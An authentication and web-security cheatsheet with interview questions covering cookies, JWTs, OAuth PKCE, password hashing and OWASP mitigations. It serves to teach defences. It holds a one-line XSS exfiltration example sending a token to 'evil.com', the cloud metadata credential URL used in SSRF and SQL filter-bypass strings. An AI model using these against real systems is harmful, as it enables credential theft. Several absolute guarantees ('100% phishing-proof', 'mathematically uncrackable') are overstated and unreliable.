# Authentication & Web Security Cheatsheet & Deep Dive

---

## 1. What is it?

The Authentication and Web Security Cheatsheet is an operational reference guide, cryptographic lookup manual, and vulnerability defense matrix for full-stack software engineers. It condenses the essential security protocols, session management paradigms, and token architectures into rapid-retrieval tables and production code patterns: **Cookie Security Flags and Prefixes (`__Host-`)**, **JWT Anatomy and Claims (`sub`, `iss`, `aud`, `jti`)**, **OAuth 2.0 / OIDC Grant Workflows**, **Password Hashing Algorithms (Argon2id vs bcrypt)**, and the **OWASP Top 10 Mitigation Matrix**.

```
+-----------------------------------------------------------------------------------+
|                        Authentication & Security Stack                            |
+-----------------------------------------------------------------------------------+
| Identity Layer:        Passwords (Argon2id), OAuth2 / OIDC, FIDO2 WebAuthn Passkeys|
| Token Transport:       JWT (RS256 Asymmetric Key Pair), JWKS Distribution         |
| Session Persistence:   HttpOnly, Secure, SameSite=Lax/Strict, __Host- Cookies     |
| Access Control:        RBAC (Roles), ABAC (Attributes), ReBAC (Relationships)      |
| Browser Defenses:      CSP (Nonced), HSTS (Preloaded), CORS, X-Content-Type-Options|
| OWASP Hardening:       Zero SQLi (Prepared Stmts), CSRF (SameSite), SSRF (Private) |
+-----------------------------------------------------------------------------------+
```

---

## 2. Why does it exist?

Web applications operate in an untrusted, hostile network environment:
1. **The Cost of Breach:** Compromised databases leak credentials, leading to credential stuffing across consumer platforms. Proper hashing (Argon2id) guarantees that dumped hashes remain mathematically uncrackable.
2. **Session Hijacking:** Insecure client storage (`localStorage`) allows malicious third-party dependencies or XSS injection to exfiltrate session credentials in a single line of JavaScript (`fetch('evil.com?t=' + localStorage.token)`).
3. **Broken Authorization (BOLA/IDOR):** The #1 vulnerability in modern APIs is failing to verify that the authenticated user actually owns the record they are modifying.

---

## 3. Mental Model

To master security in interviews, visualize security using the **Zero-Trust Triple Verification Model**:

```
[ INCOMING API REQUEST ]
            |
            v
  [ CHECK 1: AUTHENTICATION (Who are you?) ]
  - Verify RS256 signature against Auth Public Key
  - Verify expiration: current_time < exp
  - Result: Authenticated Principal -> req.user = { id: 42, role: "member" }
            |
            v
  [ CHECK 2: AUTHORIZATION (What are your general privileges?) ]
  - Does req.user.role have the required permission? ("documents:delete")
  - Result: Permitted to delete documents
            |
            v
  [ CHECK 3: OBJECT OWNERSHIP (Do you own THIS specific record?) ]
  - Query: SELECT * FROM documents WHERE id = $1 AND tenant_id = $2
  - Result: Verifies resource ownership before executing mutation!
```

---

## 4. Basic Example

### Hardened Production Cookie Configuration

```typescript
import { CookieOptions } from "express";

export const secureCookieConfig: CookieOptions = {
  httpOnly: true, // Prevents JavaScript document.cookie access (Mitigates XSS token theft)
  secure: process.env.NODE_ENV === "production", // Transmits ONLY over HTTPS
  sameSite: "lax", // Protects against Cross-Site Request Forgery (CSRF)
  path: "/", // Scoped to entire domain
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
};

// Application using the __Host- prefix standard:
// Cookies prefixed with __Host- MUST have secure: true, path: '/', and NO domain attribute!
export const HOST_PREFIXED_COOKIE_NAME = "__Host-session-token";
```

---

## 5. Real Example

### Password Hashing with Argon2id and Timing-Safe Verification

```typescript
import argon2 from "argon2";
import crypto from "crypto";

export class SecurityService {
  /**
   * Hashes passwords using Argon2id (OWASP recommended parameters)
   * Memory cost: 64MB (65536 KB), Time cost: 3 iterations, Parallelism: 4 threads
   */
  static async hashPassword(password: string): Promise<string> {
    return argon2.hash(password, {
      type: argon2.argon2id,
      memoryCost: 65536,
      timeCost: 3,
      parallelism: 4,
      hashLength: 32,
    });
  }

  /**
   * Verifies incoming password against stored hash.
   * Handles internal salt extraction and timing safety automatically.
   */
  static async verifyPassword(hash: string, plainText: string): Promise<boolean> {
    try {
      return await argon2.verify(hash, plainText);
    } catch {
      return false;
    }
  }

  /**
   * Timing-safe comparison for API keys and webhook secrets
   */
  static timingSafeEqual(strA: string, strB: string): boolean {
    const bufA = Buffer.from(strA, "utf8");
    const bufB = Buffer.from(strB, "utf8");

    if (bufA.length !== bufB.length) return false;
    return crypto.timingSafeEqual(bufA, bufB);
  }
}
```

---

## 6. Under the Hood

### JWT Anatomy & Standard Claims

A JSON Web Token consists of: `Base64Url(Header) . Base64Url(Payload) . Signature`

```
+------------------------------------------------------------------------------------+
| Header:  { "alg": "RS256", "typ": "JWT", "kid": "auth-key-2026-v1" }               |
+------------------------------------------------------------------------------------+
| Payload: Standard Registered Claims (RFC 7519):                                    |
|   - iss (Issuer):      "https://auth.acme.com"                                     |
|   - sub (Subject):     "usr_98a72b" (Unique User ID)                               |
|   - aud (Audience):    "https://api.acme.com" (Target Resource Server)             |
|   - exp (Expiration):  1772500000 (UNIX timestamp in seconds)                      |
|   - nbf (Not Before):  1772490000 (Token invalid before this time)                 |
|   - iat (Issued At):   1772490000                                                  |
|   - jti (JWT ID):      "unique-uuid-for-replay-prevention"                         |
+------------------------------------------------------------------------------------+
| Signature: RSASSA-PKCS1-v1_5 SHA-256(Header + "." + Payload, PrivateKey)          |
+------------------------------------------------------------------------------------+
```

---

## 7. Important Rules

1. **The Rule of Token Storage:** Never store sensitive authentication tokens (Access or Refresh) in `localStorage` or `sessionStorage`. Any XSS vulnerability allows malicious JavaScript to exfiltrate the token. Store session tokens in `HttpOnly`, `Secure`, `SameSite=Lax` cookies.
2. **The Rule of Parameterized SQL:** Never concatenate user input directly into SQL strings. Always use prepared statements (`$1, $2`). Parameterized queries guarantee 100% mathematical immunity against SQL Injection.
3. **The Rule of Password Hashing:** Never use MD5, SHA-1, SHA-256, or SHA-512 for passwords. Fast general-purpose hashing functions allow modern GPUs to compute billions of guesses per second. Always use slow, memory-hard algorithms: **Argon2id (gold standard)** or **bcrypt**.
4. **The Rule of OAuth PKCE:** Never use the deprecated Implicit Grant. Always use **Authorization Code Grant with PKCE** (Proof Key for Code Exchange) for Single Page Apps (SPAs) and Mobile native clients.

---

## 8. Common Mistakes

### Mistake 1: Accepting the "none" Algorithm in JWTs
Older JWT libraries contained a vulnerability where an attacker modified the header to `{"alg": "none"}`, removed the signature, and bypassed verification. Always explicitly whitelist accepted algorithms: `jwt.verify(token, key, { algorithms: ['RS256'] })`.

### Mistake 2: Missing CSRF Defenses with `SameSite=None`
Setting `SameSite=None` without verifying Anti-CSRF tokens. Browsers will send the cookie on cross-site requests, allowing an attacker's website to forge state-changing POST requests.

### Mistake 3: SSRF Vulnerability in Webhook or Avatar Fetchers
Accepting a URL from a user (e.g., `https://example.com/avatar.png`) and fetching it directly on the server without checking if the resolved IP points to private local network ranges (`127.0.0.1`, `169.254.169.254`). Attackers can steal AWS IAM credentials via the AWS metadata service.

---

## 9. Best Practices

1. **Refresh Token Rotation with Automatic Reuse Detection:** Issue single-use refresh tokens. When a refresh token is used, invalidate it and issue a new one. If an already-revoked refresh token is presented, trigger a security alert and **revoke the entire token family** for that user immediately.
2. **Enforce `__Host-` Cookie Prefixes:**
   Use `__Host-` cookie prefixes to guarantee that the cookie is secure, sent only to the host domain (no subdomains), and has path set to `/`.
3. **Implement Subresource Integrity (SRI):** When loading scripts from third-party CDNs, include an SRI hash (`integrity="sha384-..."`) to ensure the CDN cannot execute tampered code if breached.
4. **Strict Rate Limiting on Authentication Routes:** Apply sliding-window rate limiters on `/login`, `/forgot-password`, and `/verify-otp` to eliminate credential stuffing and brute-force attacks.

---

## 10. Performance Considerations

* **Symmetric (HS256) vs Asymmetric (RS256) Verification:** RS256 token verification requires modular exponentiation math, consuming significantly more CPU than HS256 HMAC hashing. Cache public keys in RAM and avoid re-parsing JWKS endpoints on every incoming request.
* **Bcrypt Cost Factor Sizing:** Bcrypt cost 12 takes ~250ms per hash. Sizing cost factor to 16 takes ~4,000ms, making the login endpoint an easy vector for CPU Denial of Service if an attacker submits 100 concurrent logins.

---

## 11. Security Considerations: OWASP Top 10 Rapid Matrix

| OWASP Vulnerability | Core Attack Vector | Modern Engineering Mitigation |
| :--- | :--- | :--- |
| **A01: Broken Access Control** | IDOR / BOLA: User accesses `/api/orders/9981` belonging to another tenant | Enforce ownership check in query (`WHERE id = $1 AND user_id = $2`) or PostgreSQL RLS |
| **A02: Cryptographic Failures** | Plaintext password leaks; weak MD5/SHA1 hashing; missing TLS | Hash with Argon2id; enforce TLS 1.3; encrypt secrets at rest using AES-256-GCM |
| **A03: Injection** | SQLi, NoSQL injection, command injection via `exec()` | Parameterized queries (`$1, $2`); sanitize MongoDB input with `mongo-sanitize` |
| **A04: Insecure Design** | Missing rate limits; unlimited file uploads; lack of business invariants | Threat modeling; sliding window rate limiters; file size/MIME verification |
| **A05: Security Misconfiguration** | Default passwords; verbose error stack traces in production; missing CORS | Helmet middleware; disable debug headers; strict CORS origin whitelisting |
| **A06: Vulnerable Components** | Outdated npm packages with known CVEs | Automated `npm audit`; Snyk / Dependabot scanning in CI/CD pipeline |
| **A07: Identification / Auth Failures** | Brute force; session fixation; credential stuffing | Argon2id; MFA / TOTP; Refresh Token Rotation; lockout after 5 failed attempts |
| **A08: Software & Data Integrity** | Deserialization attacks; tampered CDN scripts | Avoid `eval()` and `deserialize()`; enforce Subresource Integrity (SRI) on CDNs |
| **A09: Security Logging Failures** | Breaches undetected due to missing audit logs | Centralized structured JSON logging (Pino/ELK); alert on multiple 401/403 bursts |
| **A10: SSRF (Server-Side Request Forgery)**| Server fetches internal metadata endpoints (`169.254.169.254`) | Validate URLs; block private RFC 1918 IP addresses before executing outbound fetch |

---

## 12. Alternatives: Authentication Paradigms

| Auth Paradigm | Token Type | State Location | Pros | Cons |
| :--- | :--- | :--- | :--- | :--- |
| **Stateful Sessions** | Opaque Session ID | Server Redis / DB | Instant revocation, minimal payload size | Requires centralized database lookup per request |
| **Stateless JWT** | Signed JSON Token | Client Cookie/Header | Scales across microservices, zero DB lookup | Cannot revoke instantly without distributed blocklist |
| **OAuth 2.0 / OIDC** | Scoped Access Tokens | Auth Server (Keycloak/Auth0)| Delegated permissions, standardized SSO | Protocol complexity (PKCE, state, nonce) |
| **Passkeys (WebAuthn)**| Asymmetric Key Pair | Device Secure Enclave | **Phishing-proof**, zero shared passwords | Complex account recovery UX |

---

## 13. Trade-offs

* **Stateless Scaling vs Immediate Revocation:** Stateless JWTs eliminate database roundtrips, but make instant token revocation impossible without introducing a stateful Redis blocklist (which reintroduces database overhead).
* **Security Rigor vs UX Friction:** Enforcing 2FA, biometric re-prompts, and 15-minute session timeouts maximizes security posture, but adds user friction that can impact customer retention.

---

## 14. Real-World Usage

* **GitHub:** Mandated two-factor authentication (2FA) for all code contributors, supporting FIDO2 hardware security keys (YubiKey) to neutralize supply-chain hijacking attacks.
* **Stripe:** Signs every outbound webhook with an HMAC-SHA256 signature (`Stripe-Signature`), allowing developers to mathematically verify that incoming webhook events were generated by Stripe and have not been tampered with.

---

## 15. Placement Interview Questions

### Basic Level
1. **Explain the difference between Symmetric (HS256) and Asymmetric (RS256) JWT signing.**
   * *Answer:* HS256 uses a **single shared secret key** for both signing and verifying the token. Every downstream service that verifies the token must possess the secret key; if one service is compromised, the attacker can forge arbitrary tokens. RS256 uses an **asymmetric key pair**: the authentication server signs tokens with a **Private Key**, while all downstream microservices verify tokens using the public **Public Key**. Downstream services can verify tokens, but cannot forge them.

2. **What does the `HttpOnly` flag do on a cookie?**
   * *Answer:* `HttpOnly` prevents client-side JavaScript (e.g., `document.cookie`) from reading or modifying the cookie. It acts as a primary defense against token theft via Cross-Site Scripting (XSS).

3. **What is the difference between `SameSite=Strict` and `SameSite=Lax`?**
   * *Answer:*
     - `Strict`: The cookie is sent **only** if the request originates from the exact same site. It is never sent when following a top-level link from an external site (e.g., clicking a link from an email will not send the cookie).
     - `Lax` (Default): The cookie is withheld on cross-site subrequests (images, iframes, AJAX POST), but **is sent when navigating to the origin site via top-level link clicks (`<a href>`)**, maintaining link UX while preventing CSRF on mutations.

4. **Why is salting passwords necessary?**
   * *Answer:* A salt is a unique, cryptographically random string generated for each user and concatenated with their password before hashing. Salting ensures that identical passwords produce completely different hash outputs, completely neutralizing **Rainbow Table attacks** (precomputed hash lookup tables) and preventing an attacker from identifying users with identical passwords.

5. **What is an Insecure Direct Object Reference (IDOR)?**
   * *Answer:* IDOR (also called Broken Object Level Authorization) occurs when an API endpoint uses user-supplied input (e.g., an ID in `/api/documents/1092`) to access a resource directly without verifying that the authenticated user owns or has permission to access that specific object.

---

### Conceptual Level
6. **Walk me through the OAuth 2.0 Authorization Code Flow with PKCE.**
   * *Answer:*
     1. Client generates a random `code_verifier` and derives its SHA-256 hash, called the `code_challenge`.
     2. Client redirects the user to the Authorization Server, passing `code_challenge` and `code_challenge_method=S256`.
     3. User logs in and grants permissions.
     4. Auth Server redirects back to the client with an `authorization_code`.
     5. Client sends a POST request to the Auth Server's token endpoint containing the `authorization_code` and the original `code_verifier`.
     6. Auth Server hashes the `code_verifier` and verifies it matches the original `code_challenge`.
     7. If valid, the Auth Server issues access and refresh tokens.

7. **How does Refresh Token Rotation with Reuse Detection protect against token theft?**
   * *Answer:* Every time a refresh token is used to obtain a new access token, the used refresh token is invalidated and a brand new refresh token is issued. If an attacker and a victim both possess a refresh token:
     - The victim uses the token; it is marked revoked.
     - The attacker later attempts to use the same token.
     - The server detects that an **already-revoked token is being reused**!
     - The server activates the **Compromise Protocol**: immediately revoking the entire token family (invalidating all active sessions for that user) and forcing re-authentication.

8. **Compare bcrypt and Argon2id. Why is Argon2id preferred?**
   * *Answer:*
     - *bcrypt:* Uses a modified Eksblowfish algorithm. Introduces memory usage (4KB) to resist older GPU attacks, but has a hard 72-byte password length limit and can be parallelized on specialized FPGA/ASIC hardware.
     - *Argon2id:* Winner of the Password Hashing Competition. It provides **memory-hard** and **time-hard** parameters. It combines Argon2d (GPU-cracking resistance) and Argon2i (cache-timing side-channel resistance). Attackers cannot parallelize guesses without allocating massive amounts of physical RAM (e.g., 64MB per thread), making hardware attacks cost-prohibitive.

9. **Explain how Cross-Site Request Forgery (CSRF) works and how modern cookies neutralize it.**
   * *Answer:* CSRF tricks a victim's browser into executing unwanted actions on an application where they are currently authenticated. An attacker includes a malicious link or form (`<form action="bank.com/transfer" method="POST">`) on an external website. When the user visits, the browser automatically includes `bank.com`'s session cookies.
   * *Neutralization:* The `SameSite=Lax` or `Strict` cookie attribute instructs the browser **not to include the cookie on cross-site POST requests**, completely neutralizing the attack without requiring manual anti-CSRF tokens.

10. **What is Server-Side Request Forgery (SSRF) and how do attackers exploit it in cloud environments?**
    * *Answer:* SSRF occurs when an application accepts a URL from a user and fetches it from the backend server without validation. In cloud environments (AWS, GCP), attackers submit the internal link-local metadata IP: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The server fetches the URL and returns internal IAM role credentials, granting the attacker full cloud access.

---

### Implementation Level
11. **Write a constant-time HMAC-SHA256 signature verification function in Node.js to validate webhook payloads.**
    * *Answer:*
    ```typescript
    import crypto from "crypto";

    export function verifyWebhook(
      rawBody: string | Buffer,
      signatureHeader: string,
      secret: string
    ): boolean {
      const computedHash = crypto
        .createHmac("sha256", secret)
        .update(rawBody)
        .digest("hex");

      const sigBuffer = Buffer.from(signatureHeader, "utf8");
      const computedBuffer = Buffer.from(computedHash, "utf8");

      if (sigBuffer.length !== computedBuffer.length) return false;
      return crypto.timingSafeEqual(sigBuffer, computedBuffer);
    }
    ```

12. **Implement a Content Security Policy (CSP) header generator with cryptographic nonces in Express.**
    * *Answer:*
    ```typescript
    import crypto from "crypto";
    import { Request, Response, NextFunction } from "express";

    export function cspNonceMiddleware(req: Request, res: Response, next: NextFunction) {
      const nonce = crypto.randomBytes(16).toString("base64");
      res.locals.nonce = nonce;

      res.setHeader(
        "Content-Security-Policy",
        `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'; object-src 'none'; frame-ancestors 'none';`
      );
      next();
    }
    ```

13. **How do you safely validate URLs against SSRF before making an outgoing HTTP request?**
    * *Answer:*
    ```typescript
    import dns from "node:dns/promises";
    import ipaddr from "ipaddr.js";

    export async function validateSafeUrl(urlString: string): Promise<boolean> {
      const parsed = new URL(urlString);
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return false;

      const { address } = await dns.lookup(parsed.hostname);
      const addr = ipaddr.parse(address);

      // Reject loopback, private RFC 1918, link-local (169.254.x.x)
      const range = addr.range();
      const forbiddenRanges = ["loopback", "private", "linkLocal", "uniqueLocal"];
      return !forbiddenRanges.includes(range);
    }
    ```

14. **How do you implement an API Key hashing pattern where keys are shown once and stored safely in the database?**
    * *Answer:*
      1. Generate raw API key: `const rawKey = 'sk_live_' + crypto.randomBytes(32).toString('hex')`.
      2. Show `rawKey` to the user once.
      3. Compute SHA-256 hash: `const hash = crypto.createHash('sha256').update(rawKey).digest('hex')`.
      4. Store `hash` and key prefix (`sk_live_...`) in the database.
      5. When authenticating: hash incoming key with SHA-256 and look up by hash.

15. **How do you implement immediate token revocation for stateless JWTs using Redis?**
    * *Answer:*
      - Embed a `jti` (JWT ID: UUID) in the token payload.
      - On logout: extract `jti` and remaining time-to-live (`exp - now`).
      - Store in Redis: `await redis.set('blacklist:' + jti, 'revoked', { EX: remainingSeconds })`.
      - Middleware verifies signature and checks: `if (await redis.exists('blacklist:' + payload.jti)) return 401;`.

---

### Debugging Level
16. **Why does an authentication cookie set with `SameSite=None` fail to be saved in Google Chrome?**
    * *Answer:* Google Chrome strictly requires that any cookie configured with `SameSite=None` **must also include the `Secure` flag** and be transmitted exclusively over HTTPS. If `Secure` is missing or the connection is plain HTTP, Chrome silently rejects the cookie.

17. **Why does an Express app throw `Error: secret option required for sessions` when deployed to production?**
    * *Answer:* Environment variables were not loaded before the session configuration initialized. In TypeScript/ES6, `import` statements are hoisted. If `import dotenv from 'dotenv'; dotenv.config();` is placed *after* the session module import, `process.env.SESSION_SECRET` evaluates to `undefined`. Ensure `dotenv.config()` is executed at the very top of the application entry file.

18. **Why is a website vulnerable to Clickjacking even though it sets `X-Frame-Options: SAMEORIGIN`?**
    * *Answer:* An attacker can frame the website inside a sub-frame or through proxy framing. Modern browsers recommend using **Content Security Policy `frame-ancestors 'none';`** or `frame-ancestors 'self';`, which supersedes `X-Frame-Options` and provides robust origin frame restrictions.

19. **Why did a database query vulnerable to SQL injection bypass an input filter that stripped the word `SELECT`?**
    * *Answer:* Blacklist filtering is a flawed security strategy. Attackers bypass naive string stripping using alternate capitalization (`sElEcT`), double nesting (`SELSELECTECT` -> when inner `SELECT` is stripped, outer letters collapse into `SELECT`), or URL/Hex encodings (`%53%45%4C%45%43%54`). The only valid defense is **Parameterized Queries (Prepared Statements)**.

20. **Why did users experience sporadic authentication logouts after deploying your API to 3 Kubernetes pods?**
    * *Answer:* The application used the default in-memory session store (`MemoryStore`). Each Kubernetes pod maintained its own isolated memory heap. When the load balancer routed a user's subsequent request to a different pod, that pod could not find the session ID in its local RAM and returned 401. Fix: Use a centralized **Redis session store**.

---

### Scenario-Based Questions
21. **Scenario: You are designing an authentication architecture for both a Web SPA (React) and a Native Mobile App (iOS/Android). How do you store tokens securely on both platforms?**
    * *Answer:*
      - *Web SPA:* Store the Refresh Token in an `HttpOnly`, `Secure`, `SameSite=Lax` cookie to protect against XSS token theft. Store the short-lived Access Token in browser memory.
      - *Native Mobile App:* Mobile apps are not subject to browser cookie policies or XSS. Store tokens in the operating system's hardware-backed cryptographic keychain: **iOS Keychain Services** and **Android Keystore / EncryptedSharedPreferences**. Transmit tokens in the `Authorization: Bearer <token>` header.

22. **Scenario: Your company suffers an emergency incident where an employee's private RSA signing key for JWTs was committed to a public GitHub repo. What is your immediate incident response protocol?**
    * *Answer:*
      1. Immediately revoke the compromised RSA private key.
      2. Generate a new RSA key pair with a new Key ID (`kid: "key-2026-v2"`).
      3. Update the Authorization Server to sign new tokens with the new key.
      4. Update the public JWKS endpoint with the new public key.
      5. Older tokens signed with the compromised key will instantly fail verification at all API gateways.
      6. Invalidate all active refresh tokens in Redis to force all users globally to re-authenticate with MFA.

23. **Scenario: You are implementing a multi-tenant B2B SaaS platform. How do you guarantee that a user from Company A can never read Company B's data via an IDOR attack?**
    * *Answer:*
      1. Embed `tenantId` in the cryptographically signed JWT.
      2. Enforce database Row-Level Security (RLS) in PostgreSQL, binding the connection's session variable to the verified `tenantId`.
      3. In the ORM layer, use a middleware extension that automatically appends `where: { tenantId }` to every query.
      4. Never trust client-supplied tenant IDs.

24. **Scenario: How do you implement a secure "Forgot Password" flow that resists token enumeration and timing attacks?**
    * *Answer:*
      1. Generate a cryptographically random token: `crypto.randomBytes(32).toString('hex')`.
      2. Store the **SHA-256 hash** of the token in the database with a 15-minute expiration: `(user_id, token_hash, expires_at)`.
      3. Send the raw unhashed token in the email reset link (`/reset-password?token=...`).
      4. Always return the exact same generic response: *"If an account exists with this email, a reset link has been sent"*, with uniform response latency to eliminate account enumeration via timing attacks.

25. **Scenario: You need to support an external third-party integration that queries your API on behalf of users. What OAuth 2.0 grant do you implement?**
    * *Answer:* Implement the **OAuth 2.0 Authorization Code Grant**. The third-party redirects the user to your authorization portal, the user consents to specific scopes (`read:reports`), and your server issues a scoped access token to the third party without revealing user passwords.

---

### Advanced Architectural Questions
26. **Explain FIDO2, WebAuthn, and how Passkeys eliminate phishing attacks.**
    * *Answer:* WebAuthn uses asymmetric public-key cryptography. During registration, the user's device (Secure Enclave/TPM) creates a key pair. The private key never leaves the hardware. During login, the server sends a challenge. The device signs the challenge *only if* the browser verifies that the current origin matches the domain registered to the credential. Even if a user is tricked into visiting a phishing site (`evil-bank.com`), the browser detects the origin mismatch and refuses to sign the challenge, making passkeys 100% phishing-proof.

27. **What is the difference between RBAC (Role-Based) and ABAC (Attribute-Based Access Control)?**
    * *Answer:*
      - *RBAC:* Evaluates static role assignments (`user.roles.includes('ADMIN')`). Simple, but suffers from "role explosion" when fine-grained policies are required.
      - *ABAC:* Evaluates dynamic attributes across the Subject (role, department), Resource (owner, sensitivity), Action (read, delete), and Environment (time of day, IP subnet, device compliance). Enables fine-grained policies like: *"A Doctor can read patient records ONLY IF assigned to that patient AND accessing from within the hospital network during shift hours."*

28. **Explain the JSON Web Key Set (JWKS) protocol.**
    * *Answer:* A JWKS is an endpoint (`/.well-known/jwks.json`) hosted by the Authorization Server that exposes public cryptographic keys formatted as JSON Web Keys (JWKs). API gateways query this endpoint to retrieve public keys matching the `kid` (Key ID) header in incoming JWTs, allowing distributed services to verify asymmetric signatures without manual key rotation deploys.

29. **What is Mutual TLS (mTLS) and how does it secure microservice meshes?**
    * *Answer:* In standard TLS, only the server proves its identity to the client using a certificate. In **Mutual TLS (mTLS)**, both the client and the server present and verify X.509 digital certificates issued by a private internal Certificate Authority (CA). It guarantees bidirectional cryptographic identity and encryption for all internal service-to-service communication.

30. **Explain how Time-Based One-Time Passwords (TOTP - RFC 6238) work mathematically.**
    * *Answer:* TOTP derives a dynamic 6-digit code from a shared base32 secret and the current UNIX time:
      1. Calculate time-step counter: $C = \lfloor \text{currentTime} / 30 \rfloor$.
      2. Compute HMAC-SHA1 of counter $C$ using the shared secret key.
      3. Dynamic Truncation: extract a 4-byte dynamic binary code from the HMAC hash.
      4. Convert binary code modulo $1,000,000$ to produce the final 6-digit integer code.

---

## 16. Coding Questions

### Coding Challenge 1: Custom RBAC / ABAC Permission Evaluation Engine

```typescript
export interface UserContext {
  id: string;
  roles: string[];
  department: string;
}

export interface ResourceContext {
  id: string;
  ownerId: string;
  department: string;
  isClassified: boolean;
}

export type Action = "read" | "write" | "delete";

export function canPerformAction(
  user: UserContext,
  action: Action,
  resource: ResourceContext
): boolean {
  // Superadmin override
  if (user.roles.includes("SUPERADMIN")) return true;

  // ABAC Rule 1: Classified resources require Security role
  if (resource.isClassified && !user.roles.includes("SECURITY_OFFICER")) {
    return false;
  }

  // ABAC Rule 2: Department isolation
  if (user.department !== resource.department) {
    return false;
  }

  // ABAC Rule 3: Deletion requires owner OR Admin
  if (action === "delete") {
    return user.id === resource.ownerId || user.roles.includes("ADMIN");
  }

  // ABAC Rule 4: Reading and writing allowed for department members
  return true;
}
```

### Coding Challenge 2: Secure Cookie Parser and Signature Verifier

```typescript
import crypto from "crypto";

/**
 * Signs a cookie value using HMAC-SHA256 (cookie-parser format: s:val.signature)
 */
export function signCookie(value: string, secret: string): string {
  const signature = crypto
    .createHmac("sha256", secret)
    .update(value)
    .digest("base64")
    .replace(/=+$/, "");
  return `s:${value}.${signature}`;
}

/**
 * Unsigns and verifies a signed cookie value. Returns false if tampered.
 */
export function unsignCookie(signedValue: string, secret: string): string | false {
  if (!signedValue.startsWith("s:")) return false;

  const dotIndex = signedValue.lastIndexOf(".");
  if (dotIndex === -1) return false;

  const value = signedValue.slice(2, dotIndex);
  const expectedSigned = signCookie(value, secret);

  const bufActual = Buffer.from(signedValue);
  const bufExpected = Buffer.from(expectedSigned);

  if (bufActual.length !== bufExpected.length) return false;
  return crypto.timingSafeEqual(bufActual, bufExpected) ? value : false;
}
```

---

## 17. Common Interview Traps

* **The Trap:** The interviewer asks: *"If an authentication cookie is set with `HttpOnly`, is the application completely immune to Cross-Site Scripting (XSS) attacks?"*
  * **How candidates fail:** Saying "Yes, because the attacker cannot read the cookie."
  * **The Winning Answer:** **No!** Setting `HttpOnly` merely prevents an attacker from **exfiltrating the raw cookie string** via `document.cookie`. However, an attacker executing arbitrary JavaScript can still perform unauthorized actions **on behalf of the victim** by issuing `fetch()` requests directly from the victim's browser session (the browser automatically attaches the cookie!), modifying the DOM, injecting credential phishers, and logging keystrokes.
* **The Trap:** *"Can we store JWT tokens in `sessionStorage` instead of `localStorage` to make them secure against XSS?"*
  * **How candidates fail:** Saying "Yes, sessionStorage is cleared when the tab closes, so it's secure."
  * **The Winning Answer:** **No!** Any active XSS script executing in the current browsing context has full, unrestricted access to `sessionStorage` via `window.sessionStorage`. Closing the tab later does not prevent the attacker from stealing the token while the tab is open.

---

## 18. Revision Summary

```
+-----------------------------------------------------------------------------------+
|               Authentication & Security High-Yield Revision Matrix                |
+-----------------------------------------------------------------------------------+
| Cookies:             HttpOnly (XSS shield), Secure (HTTPS), SameSite=Lax (CSRF)   |
| Cookie Prefixes:     __Host- (enforces Secure, path=/, no subdomains)             |
| Hashing:             Argon2id (memory-hard, gold standard); NEVER MD5/SHA256      |
| JWT:                 Header.Payload.Signature; verify RS256; validate exp and aud |
| OAuth2 PKCE:         code_verifier + code_challenge prevents auth code hijacking  |
| OWASP Priority #1:   Broken Access Control (IDOR); verify resource ownership      |
| SSRF Defense:        Validate URLs against private RFC 1918 and loopback IPs      |
+-----------------------------------------------------------------------------------+
```

---

## 19. Quick Reference

* **`HttpOnly`:** Disallows client-side JavaScript access to cookies.
* **`SameSite=Lax`:** Default cookie defense against cross-site CSRF mutations.
* **`__Host-`:** Secure cookie prefix enforcing root path, HTTPS, and domain lock.
* **`RS256`:** Asymmetric JWT signing (Auth Server signs; gateways verify via public key).
* **`PKCE`:** Mandatory OAuth 2.0 flow for Single Page Apps and mobile clients.
* **`Argon2id`:** Memory-hard password hashing algorithm resistant to GPU cracking.
* **`crypto.timingSafeEqual`:** Constant-time buffer comparison preventing timing attacks.
